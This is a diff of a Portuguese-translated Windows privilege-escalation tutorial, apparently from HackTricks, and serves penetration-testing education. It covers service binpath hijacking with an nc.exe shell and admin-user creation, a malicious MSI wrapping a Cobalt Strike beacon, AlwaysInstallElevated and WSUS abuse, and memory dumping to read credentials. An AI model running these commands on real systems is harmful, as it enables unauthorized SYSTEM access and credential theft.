@@ -2,9 +2,9 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-### **Melhor ferramenta para procurar vetores de Windows local privilege escalation:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
+### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
 
-## Initial Windows Theory
+## Teoria Inicial do Windows
 
 ### Access Tokens
 
@@ -33,20 +33,20 @@ acls-dacls-sacls-aces.md
 integrity-levels.md
 {{#endref}}
 
-## Windows Security Controls
+## Controles de Segurança do Windows
 
-Existem diferentes coisas no Windows que podem **impedi-lo de enumerar o sistema**, executar executáveis ou mesmo **detectar suas atividades**. Você deve **ler** a seguinte **página** e **enumerar** todos esses **mecanismos** de **defesa** **antes de iniciar a enumeração de privilege escalation**:
+Existem diferentes elementos no Windows que podem **impedir que você enumere o sistema**, execute executáveis ou até mesmo **detectar suas atividades**. Você deve **ler** a seguinte **página** e **enumerar** todos estes **mecanismos** **de defesa** antes de iniciar a enumeração de privilege escalation:
 
 
 {{#ref}}
 ../authentication-credentials-uac-and-efs/
 {{#endref}}
 
-## System Info
+## Informações do Sistema
 
-### Version info enumeration
+### Enumeração de informações de versão
 
-Verifique se a versão do Windows possui alguma vulnerabilidade conhecida (verifique também os patches aplicados).
+Verifique se a versão do Windows tem alguma vulnerabilidade conhecida (verifique também os patches aplicados).
 ```bash
 systeminfo
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
@@ -59,23 +59,23 @@ wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architec
 Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
 Get-Hotfix -description "Security update" #List only "Security Update" patches
 ```
-### Explorações por versão
+### Exploits por versão
 
-Este [site](https://msrc.microsoft.com/update-guide/vulnerability) é útil para procurar informações detalhadas sobre vulnerabilidades de segurança da Microsoft. Esta base de dados tem mais de 4.700 vulnerabilidades de segurança, mostrando o **massive attack surface** que um ambiente Windows apresenta.
+This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for searching out detailed information about Microsoft security vulnerabilities. This database has more than 4,700 security vulnerabilities, showing the **enorme superfície de ataque** that a Windows environment presents.
 
 **No sistema**
 
 - _post/windows/gather/enum_patches_
 - _post/multi/recon/local_exploit_suggester_
 - [_watson_](https://github.com/rasta-mouse/Watson)
-- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas tem watson incorporado)_
+- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas tem watson embutido)_
 
 **Localmente com informações do sistema**
 
 - [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
 - [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)
 
-**Repositórios no GitHub de exploits:**
+**Repositórios Github de exploits:**
 
 - [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
 - [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
@@ -83,7 +83,7 @@ Este [site](https://msrc.microsoft.com/update-guide/vulnerability) é útil para
 
 ### Ambiente
 
-Alguma credencial/Juicy info salva nas env variables?
+Alguma credential/Juicy info salva nas variáveis de ambiente?
 ```bash
 set
 dir env:
@@ -116,29 +116,29 @@ Stop-Transcript
 ```
 ### PowerShell Module Logging
 
-Detalhes das execuções do pipeline do PowerShell são registrados, abrangendo comandos executados, invocações de comandos e partes de scripts. No entanto, detalhes completos da execução e os resultados de saída podem não ser capturados.
+Detalhes das execuções do pipeline do PowerShell são registrados, incluindo comandos executados, invocações de comandos e trechos de scripts. Contudo, detalhes completos da execução e os resultados de saída podem não ser capturados.
 
-Para ativar isso, siga as instruções na seção "Transcript files" da documentação, optando por **"Module Logging"** em vez de **"Powershell Transcription"**.
+Para ativar isso, siga as instruções na seção "Transcript files" da documentação, escolhendo **"Module Logging"** em vez de **"Powershell Transcription"**.
 ```bash
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
 ```
-Para visualizar os últimos 15 eventos nos logs do PowersShell, você pode executar:
+Para visualizar os últimos 15 eventos dos logs do Powershell, você pode executar:
 ```bash
 Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
 ```
 ### PowerShell **Script Block Logging**
 
-Um registro completo de atividade e do conteúdo total da execução do script é capturado, garantindo que cada bloco de código seja documentado à medida que é executado. Esse processo preserva uma trilha de auditoria abrangente de cada atividade, valiosa para investigações forenses e para a análise de comportamento malicioso. Ao documentar todas as atividades no momento da execução, obtêm-se insights detalhados sobre o processo.
+É capturado um registro completo de atividade e do conteúdo integral da execução do script, garantindo que cada bloco de código seja documentado à medida que é executado. Esse processo preserva uma trilha de auditoria abrangente de cada atividade, valiosa para investigações forenses e para análise de comportamento malicioso. Ao documentar toda a atividade no momento da execução, são fornecidas informações detalhadas sobre o processo.
 ```bash
 reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
 ```
-Os eventos de log para o Script Block podem ser encontrados no Windows Event Viewer no caminho: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
+Os eventos de log do Script Block podem ser encontrados no Visualizador de Eventos do Windows no caminho: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
 Para ver os últimos 20 eventos você pode usar:
 ```bash
 Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
@@ -158,11 +158,11 @@ Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| 
 
 Você pode comprometer o sistema se as atualizações não forem solicitadas usando http**S** mas http.
 
-Comece verificando se a rede usa uma atualização WSUS sem SSL executando o seguinte no cmd:
+Comece verificando se a rede usa um non-SSL WSUS update executando o seguinte no cmd:
 ```
 reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
 ```
-Ou o seguinte no PowerShell:
+Ou o seguinte em PowerShell:
 ```
 Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
 ```
@@ -182,11 +182,11 @@ PSProvider   : Microsoft.PowerShell.Core\Registry
 ```
 E se `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ou `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` for igual a `1`.
 
-Então, **é explorável.** Se o último registro for igual a 0, então a entrada WSUS será ignorada.
+Então, **é explorável.** Se o último valor do registro for igual a 0, a entrada WSUS será ignorada.
 
-Para explorar essa vulnerabilidade você pode usar ferramentas como: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Estas são scripts de exploit MiTM armados para injetar atualizações 'falsas' em tráfego WSUS não-SSL.
+Para explorar essa(s) vulnerabilidade(s) você pode usar ferramentas como: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Estas são scripts MiTM de exploit weaponized para injetar atualizações "falsas" no tráfego WSUS não-SSL.
 
-Leia a pesquisa aqui:
+Read the research here:
 
 {{#file}}
 CTX_WSUSpect_White_Paper (1).pdf
@@ -201,11 +201,12 @@ Basicamente, esta é a falha que este bug explora:
 >
 > Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.
 
-Você pode explorar essa vulnerabilidade usando a ferramenta [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (uma vez que esteja liberada).
+Você pode explorar essa vulnerabilidade usando a ferramenta [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (assim que estiver liberada).
 
 ## Third-Party Auto-Updaters and Agent IPC (local privesc)
 
-Muitos agentes empresariais expõem uma superfície IPC em localhost e um canal de atualização privilegiado. Se o enrollment puder ser forçado para um servidor do atacante e o updater confiar em uma root CA maliciosa ou em verificações de assinatura fracas, um usuário local pode entregar um MSI malicioso que o serviço SYSTEM instala. Veja uma técnica generalizada (baseada na cadeia Netskope stAgentSvc – CVE-2025-0309) aqui:
+Muitos agentes empresariais expõem uma superfície IPC localhost e um canal de atualização privilegiado. Se o enrollment puder ser coagido para um servidor do atacante e o updater confiar em uma rogue root CA ou em verificações de assinante fracas, um usuário local pode entregar um MSI malicioso que o serviço SYSTEM instala. Veja uma técnica generalizada (baseada na cadeia Netskope stAgentSvc – CVE-2025-0309) aqui:
+
 
 {{#ref}}
 abusing-auto-updaters-and-ipc.md
@@ -213,7 +214,7 @@ abusing-auto-updaters-and-ipc.md
 
 ## KrbRelayUp
 
-Uma **local privilege escalation** vulnerability existe em ambientes Windows **domain** sob condições específicas. Essas condições incluem ambientes onde **LDAP signing is not enforced,** usuários possuem direitos que lhes permitem configurar **Resource-Based Constrained Delegation (RBCD),** e a capacidade de usuários criarem computadores dentro do domínio. É importante notar que esses **requirements** são atendidos usando as **default settings**.
+Uma vulnerabilidade de **local privilege escalation** existe em ambientes Windows **domain** sob condições específicas. Essas condições incluem ambientes onde **LDAP signing não é aplicado**, usuários possuem direitos para configurar **Resource-Based Constrained Delegation (RBCD)**, e a capacidade de usuários criarem computadores no domínio. É importante notar que esses **requisitos** são atendidos usando as **configurações padrão**.
 
 Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)
 
@@ -221,7 +222,7 @@ For more information about the flow of the attack check [https://research.nccgro
 
 ## AlwaysInstallElevated
 
-**Se** estes 2 registros estiverem **habilitados** (valor é **0x1**), então usuários de qualquer privilégio podem **instalar** (executar) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
+**Se** esses 2 registradores estiverem **habilitados** (valor é **0x1**), então usuários de qualquer privilégio podem **instalar** (executar) `*.msi` como NT AUTHORITY\\**SYSTEM**.
 ```bash
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
@@ -235,7 +236,7 @@ Se você tiver uma sessão meterpreter, pode automatizar esta técnica usando o 
 
 ### PowerUP
 
-Use o comando `Write-UserAddMSI` do power-up para criar dentro do diretório atual um binário Windows MSI para escalar privilégios. Este script grava um instalador MSI pré-compilado que solicita a adição de um usuário/grupo (portanto você precisará de acesso GUI):
+Use o comando `Write-UserAddMSI` do power-up para criar dentro do diretório atual um binário MSI do Windows para escalar privilégios. Este script grava um instalador MSI pré-compilado que solicita a adição de usuário/grupo (então você precisará de GIU acesso):
 ```
 Write-UserAddMSI
 ```
@@ -243,60 +244,60 @@ Basta executar o binário criado para escalar privilégios.
 
 ### MSI Wrapper
 
-Leia este tutorial para aprender como criar um MSI wrapper usando estas ferramentas. Note que você pode empacotar um "**.bat**" file se você **apenas** quiser **executar** **linhas de comando**
+Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **linhas de comando**
 
 
 {{#ref}}
 msi-wrapper.md
 {{#endref}}
 
-### Criar MSI com WIX
+### Create MSI with WIX
 
 
 {{#ref}}
 create-msi-with-wix.md
 {{#endref}}
 
-### Criar MSI com Visual Studio
+### Create MSI with Visual Studio
 
 - **Gere** com Cobalt Strike ou Metasploit um **new Windows EXE TCP payload** em `C:\privesc\beacon.exe`
-- Abra **Visual Studio**, selecione **Create a new project** e digite "installer" na caixa de busca. Selecione o projeto **Setup Wizard** e clique **Next**.
-- Dê ao projeto um nome, como **AlwaysPrivesc**, use **`C:\privesc`** como localização, selecione **place solution and project in the same directory**, e clique **Create**.
-- Continue clicando **Next** até chegar ao passo 3 de 4 (choose files to include). Clique **Add** e selecione o Beacon payload que você acabou de gerar. Depois clique em **Finish**.
-- Selecione o projeto **AlwaysPrivesc** no **Solution Explorer** e nas **Properties**, altere **TargetPlatform** de **x86** para **x64**.
+- Abra **Visual Studio**, selecione **Create a new project** e digite "installer" na caixa de busca. Selecione o projeto **Setup Wizard** e clique em **Next**.
+- Dê ao projeto um nome, como **AlwaysPrivesc**, use **`C:\privesc`** para o local, selecione **place solution and project in the same directory**, e clique em **Create**.
+- Continue clicando **Next** até chegar à etapa 3 de 4 (choose files to include). Clique **Add** e selecione o Beacon payload que você acabou de gerar. Em seguida clique em **Finish**.
+- Destaque o projeto **AlwaysPrivesc** no **Solution Explorer** e, em **Properties**, altere **TargetPlatform** de **x86** para **x64**.
 - Existem outras propriedades que você pode alterar, como **Author** e **Manufacturer**, que podem fazer o aplicativo instalado parecer mais legítimo.
 - Clique com o botão direito no projeto e selecione **View > Custom Actions**.
 - Clique com o botão direito em **Install** e selecione **Add Custom Action**.
-- Dê um duplo clique em **Application Folder**, selecione seu arquivo **beacon.exe** e clique em **OK**. Isso garantirá que o payload beacon seja executado assim que o instalador for iniciado.
-- Sob as **Custom Action Properties**, altere **Run64Bit** para **True**.
-- Por fim, **build it**.
-- Se o aviso `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` for exibido, certifique-se de definir a plataforma para x64.
+- Dê um duplo clique em **Application Folder**, selecione seu arquivo **beacon.exe** e clique em **OK**. Isso garantirá que o beacon payload seja executado assim que o instalador for executado.
+- Em **Custom Action Properties**, altere **Run64Bit** para **True**.
+- Finalmente, **build it**.
+- Se o aviso `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` for exibido, certifique-se de que você definiu a plataforma para x64.
 
-### Instalação do MSI
+### MSI Installation
 
-Para executar a **instalação** do arquivo `.msi` malicioso em **segundo plano:**
+Para executar a **instalação** do arquivo malicioso `.msi` em **segundo plano:**
 ```
 msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
 ```
-Para explorar esta vulnerabilidade você pode usar: _exploit/windows/local/always_install_elevated_
+Para explorar essa vulnerabilidade você pode usar: _exploit/windows/local/always_install_elevated_
 
 ## Antivírus e Detectores
 
 ### Configurações de Auditoria
 
-Estas configurações determinam o que é **registrado**, então você deve prestar atenção
+Essas configurações determinam o que está sendo **registrado**, então você deve prestar atenção
 ```
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
 ```
 ### WEF
 
-Windows Event Forwarding, é interessante saber para onde os logs são enviados
+Windows Event Forwarding, é interessante saber para onde os logs são enviados.
 ```bash
 reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
 ```
 ### LAPS
 
-**LAPS** é projetado para o **gerenciamento de senhas do Administrator local**, garantindo que cada senha seja **única, randomizada e atualizada regularmente** em computadores ingressados em um domínio. Essas senhas são armazenadas de forma segura no Active Directory e só podem ser acessadas por usuários a quem foram concedidas permissões suficientes através de ACLs, permitindo que visualizem senhas do Administrator local se autorizados.
+**LAPS** foi projetado para o **gerenciamento de senhas do Administrator local**, garantindo que cada senha seja **única, aleatorizada e atualizada regularmente** em computadores ingressados em um domínio. Essas senhas são armazenadas com segurança no Active Directory e só podem ser acessadas por usuários que tenham recebido permissões suficientes por meio de ACLs, permitindo que visualizem local admin passwords se autorizados.
 
 
 {{#ref}}
@@ -305,37 +306,36 @@ reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\Subs
 
 ### WDigest
 
-Se ativo, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
+Se ativo, **senhas em plain-text são armazenadas no LSASS** (Local Security Authority Subsystem Service).\
 [**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
 ```bash
 reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
 ```
-### Proteção do LSA
+### LSA Protection
 
-A partir do **Windows 8.1**, a Microsoft introduziu proteção aprimorada para a Autoridade de Segurança Local (LSA) para **bloquear** tentativas de processos não confiáveis de **ler sua memória** ou injetar código, aumentando a segurança do sistema.\
-[**Mais informações sobre Proteção do LSA aqui**](../stealing-credentials/credentials-protections.md#lsa-protection).
+A partir do **Windows 8.1**, a Microsoft introduziu proteção aprimorada para o Local Security Authority (LSA) para **bloquear** tentativas de processos não confiáveis de **ler sua memória** ou injetar código, aumentando a segurança do sistema.\
+[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
 ```bash
 reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
 ```
 ### Credentials Guard
 
-**Credential Guard** foi introduzido no **Windows 10**. Seu propósito é proteger as credenciais armazenadas em um dispositivo contra ameaças como ataques pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
+**Credential Guard** foi introduzido no **Windows 10**. Seu objetivo é proteger as credenciais armazenadas em um dispositivo contra ameaças como ataques pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
 ```bash
 reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
 ```
-### Credenciais em cache
+### Cached Credentials
 
-**Credenciais de domínio** são autenticadas pela **Local Security Authority** (LSA) e utilizadas por componentes do sistema operacional. Quando os dados de logon de um usuário são autenticados por um pacote de segurança registrado, as credenciais de domínio para esse usuário normalmente são estabelecidas.\
-
-[**Mais informações sobre Credenciais em cache aqui**](../stealing-credentials/credentials-protections.md#cached-credentials).
+**Domain credentials** são autenticadas pela **Local Security Authority** (LSA) e utilizadas pelos componentes do sistema operacional. Quando os dados de logon de um usuário são autenticados por um pacote de segurança registrado, as domain credentials do usuário normalmente são estabelecidas.\
+[**Mais informações sobre Cached Credentials aqui**](../stealing-credentials/credentials-protections.md#cached-credentials).
 ```bash
 reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
 ```
-## Usuários & Grupos
+## Usuários e Grupos
 
-### Enumerar Usuários & Grupos
+### Enumerar Usuários e Grupos
 
-Você deve verificar se algum dos grupos aos quais você pertence possui permissões interessantes
+Você deve verificar se algum dos grupos dos quais você faz parte possui permissões interessantes
 ```bash
 # CMD
 net users %username% #Me
@@ -352,29 +352,29 @@ Get-LocalGroupMember Administrators | ft Name, PrincipalSource
 ```
 ### Grupos privilegiados
 
-Se você **pertence a algum grupo privilegiado, pode conseguir escalar privilégios**. Saiba sobre grupos privilegiados e como abusar deles para escalar privilégios aqui:
+Se você **pertencer a algum grupo privilegiado, pode escalar privilégios**. Saiba sobre grupos privilegiados e como abusar deles para escalar privilégios aqui:
 
 
 {{#ref}}
 ../active-directory-methodology/privileged-groups-and-token-privileges.md
 {{#endref}}
 
-### Token manipulation
+### Manipulação de tokens
 
 **Saiba mais** sobre o que é um **token** nesta página: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
-Consulte a página a seguir para **aprender sobre tokens interessantes** e como abusá-los:
+Confira a página a seguir para **aprender sobre tokens interessantes** e como abusá-los:
 
 
 {{#ref}}
 privilege-escalation-abusing-tokens.md
 {{#endref}}
 
-### Usuários conectados / Sessões
+### Usuários logados / Sessões
 ```bash
 qwinsta
 klist sessions
 ```
-### Pastas de usuário
+### Pastas do usuário
 ```bash
 dir C:\Users
 Get-ChildItem C:\Users
@@ -383,7 +383,7 @@ Get-ChildItem C:\Users
 ```bash
 net accounts
 ```
-### Obter o conteúdo da área de transferência
+### Obter o conteúdo do clipboard
 ```bash
 powershell -command "Get-Clipboard"
 ```
@@ -391,8 +391,8 @@ powershell -command "Get-Clipboard"
 
 ### Permissões de Arquivos e Pastas
 
-Antes de tudo, ao listar os processos, verifique **se há senhas dentro da linha de comando do processo**.\
-Verifique se você pode **sobrescrever algum binário em execução** ou se tem permissões de escrita na pasta do binário para explorar possíveis [**DLL Hijacking attacks**](dll-hijacking/index.html):
+Primeiro de tudo, ao listar os processos, **verifique se há senhas na linha de comando do processo**.\
+Verifique se você pode **sobrescrever algum binário em execução** ou se você tem permissões de escrita na pasta de binários para explorar possíveis [**DLL Hijacking attacks**](dll-hijacking/index.html):
 ```bash
 Tasklist /SVC #List processes running and services
 tasklist /v /fi "username eq system" #Filter "system" processes
@@ -403,7 +403,7 @@ Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "sv
 #Without usernames
 Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
 ```
-Sempre verifique se há [**electron/cef/chromium debuggers** em execução; você pode abusar deles para escalar privilégios](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).
+Sempre verifique se há possíveis [**electron/cef/chromium debuggers** em execução, você pode abusar deles para escalar privilégios](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).
 
 **Verificando permissões dos binários dos processos**
 ```bash
@@ -414,7 +414,7 @@ icacls "%%z"
 )
 )
 ```
-**Verificando as permissões das pastas dos binários dos processos (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
+**Verificando permissões das pastas dos binários dos processos (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
 ```bash
 for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
 "system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
@@ -424,19 +424,19 @@ todos %username%" && echo.
 ```
 ### Memory Password mining
 
-Você pode criar um memory dump de um processo em execução usando **procdump** do sysinternals. Serviços como FTP têm as **credentials in clear text in memory**; tente fazer o memory dump e ler as credentials.
+Você pode criar um memory dump de um processo em execução usando **procdump** do sysinternals. Serviços como FTP têm as **credentials in clear text in memory**. Tente fazer o dump da memória e ler as credentials.
 ```bash
 procdump.exe -accepteula -ma <proc_name_tasklist>
 ```
-### Aplicações GUI inseguras
+### Aplicativos GUI inseguros
 
-**Aplicações executadas como SYSTEM podem permitir que um usuário abra um CMD ou navegue por diretórios.**
+**Aplicativos sendo executados como SYSTEM podem permitir que um usuário execute um CMD ou navegue por diretórios.**
 
-Exemplo: "Windows Help and Support" (Windows + F1), procure por "command prompt", clique em "Click to open Command Prompt"
+Exemplo: "Windows Help and Support" (Windows + F1), pesquise por "command prompt", clique em "Click to open Command Prompt"
 
 ## Serviços
 
-Obtenha uma lista de serviços:
+Obter uma lista de serviços:
 ```bash
 net start
 wmic service list brief
@@ -445,15 +445,15 @@ Get-Service
 ```
 ### Permissões
 
-Você pode usar **sc** para obter informações sobre um serviço
+Você pode usar **sc** para obter informações de um serviço
 ```bash
 sc qc <service_name>
 ```
-Recomenda-se ter o binário **accesschk** do _Sysinternals_ para verificar o nível de privilégio necessário para cada serviço.
+É recomendado ter o binário **accesschk** da _Sysinternals_ para verificar o nível de privilégio necessário para cada serviço.
 ```bash
 accesschk.exe -ucqv <Service_Name> #Check rights for different groups
 ```
-É recomendável verificar se "Authenticated Users" podem modificar algum serviço:
+Recomenda-se verificar se "Authenticated Users" podem modificar qualquer serviço:
 ```bash
 accesschk.exe -uwcqv "Authenticated Users" * /accepteula
 accesschk.exe -uwcqv %USERNAME% * /accepteula
@@ -462,27 +462,27 @@ accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
 ```
 [You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)
 
-### Habilitar serviço
+### Ativar serviço
 
 Se você estiver recebendo este erro (por exemplo com SSDPSRV):
 
 _System error 1058 has occurred._\
 _The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._
 
-Você pode habilitá-lo usando
+Você pode ativá-lo usando
 ```bash
 sc config SSDPSRV start= demand
 sc config SSDPSRV obj= ".\LocalSystem" password= ""
 ```
-**Tenha em conta que o serviço upnphost depende do SSDPSRV para funcionar (para XP SP1)**
+**Tenha em conta que o serviço upnphost depende de SSDPSRV para funcionar (para XP SP1)**
 
-**Outra solução alternativa para este problema é executar:**
+**Outra solução alternativa** deste problema é executar:
 ```
 sc.exe config usosvc start= auto
 ```
-### **Modificar o caminho do binário do serviço**
+### **Modificar caminho do binário do serviço**
 
-Na situação em que o grupo "Authenticated users" possui **SERVICE_ALL_ACCESS** em um serviço, é possível modificar o binário executável do serviço. Para modificar e executar **sc**:
+No cenário em que o grupo "Authenticated users" possui **SERVICE_ALL_ACCESS** em um serviço, é possível modificar o binário executável do serviço. Para modificar e executar **sc**:
 ```bash
 sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
 sc config <Service_Name> binpath= "net localgroup administrators username /add"
@@ -497,17 +497,17 @@ net stop [service name] && net start [service name]
 ```
 Privilégios podem ser escalados através de várias permissões:
 
-- **SERVICE_CHANGE_CONFIG**: Permite reconfigurar o binário do serviço.
-- **WRITE_DAC**: Permite reconfiguração de permissões, possibilitando alterar configurações do serviço.
+- **SERVICE_CHANGE_CONFIG**: Permite reconfiguração do binário do serviço.
+- **WRITE_DAC**: Habilita reconfiguração de permissões, levando à capacidade de alterar configurações do serviço.
 - **WRITE_OWNER**: Permite aquisição de propriedade e reconfiguração de permissões.
-- **GENERIC_WRITE**: Herda a capacidade de alterar configurações do serviço.
-- **GENERIC_ALL**: Também herda a capacidade de alterar configurações do serviço.
+- **GENERIC_WRITE**: Concede a capacidade de alterar configurações do serviço.
+- **GENERIC_ALL**: Também concede a capacidade de alterar configurações do serviço.
 
 Para a detecção e exploração desta vulnerabilidade, pode-se utilizar o _exploit/windows/local/service_permissions_.
 
-### Services binaries weak permissions
+### Binários de serviços com permissões fracas
 
-**Verifique se pode modificar o binário que é executado por um serviço** ou se você tem **permissão de escrita na pasta** onde o binário está localizado ([**DLL Hijacking**](dll-hijacking/index.html)).\
+**Verifique se você pode modificar o binário que é executado por um serviço** ou se você tem **permissões de escrita na pasta** onde o binário está localizado ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
 Você pode obter todos os binários que são executados por um serviço usando **wmic** (não em system32) e verificar suas permissões usando **icacls**:
 ```bash
 for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt
@@ -522,8 +522,8 @@ FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >>
 ```
 ### Permissões de modificação do registro de serviços
 
-Você deve verificar se pode modificar qualquer registro de serviço.\
-Você pode **verificar** suas **permissões** sobre um **registro de serviço** fazendo:
+Você deve verificar se consegue modificar algum registro de serviço.\
+Você pode **verificar** suas **permissões** sobre um **registro** de serviço executando:
 ```bash
 reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services
 
@@ -532,26 +532,26 @@ for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\
 
 get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
 ```
-Deve-se verificar se **Authenticated Users** ou **NT AUTHORITY\INTERACTIVE** possuem permissões `FullControl`. Se for o caso, o binário executado pelo serviço pode ser alterado.
+Deve-se verificar se **Authenticated Users** ou **NT AUTHORITY\INTERACTIVE** possuem permissões `FullControl`. Se sim, o binário executado pelo serviço pode ser alterado.
 
-Para alterar o Path do binário executado:
+Para alterar o caminho do binário executado:
 ```bash
 reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
 ```
-### Permissões AppendData/AddSubdirectory no registro de serviços
+### Registro de serviços AppendData/AddSubdirectory permissões
 
-Se você tem essa permissão sobre um registro isso significa que **você pode criar sub-registros a partir deste**. No caso de serviços do Windows isso é **suficiente para executar código arbitrário:**
+Se você tiver essa permissão sobre um registro isso significa que **você pode criar subregistros a partir deste**. No caso de Windows services isto é **suficiente para executar código arbitrário:**
 
 
 {{#ref}}
 appenddata-addsubdirectory-permission-over-service-registry.md
 {{#endref}}
 
-### Caminhos de serviço sem aspas
+### Unquoted Service Paths
 
-Se o caminho para um executável não estiver entre aspas, Windows tentará executar cada parte que termina antes de um espaço.
+Se o caminho para um executável não estiver entre aspas, o Windows tentará executar cada parte antes de um espaço.
 
-For example, for the path _C:\Program Files\Some Folder\Service.exe_ Windows will try to execute:
+Por exemplo, para o caminho _C:\Program Files\Some Folder\Service.exe_ o Windows tentará executar:
 ```bash
 C:\Program.exe
 C:\Program Files\Some.exe
@@ -583,13 +583,13 @@ msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f ex
 ```
 ### Ações de Recuperação
 
-Windows permite que usuários especifiquem ações a serem executadas caso um serviço falhe. Esse recurso pode ser configurado para apontar para um binary. Se esse binary puder ser substituído, privilege escalation pode ser possível. Mais detalhes podem ser encontrados na [documentação oficial](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).
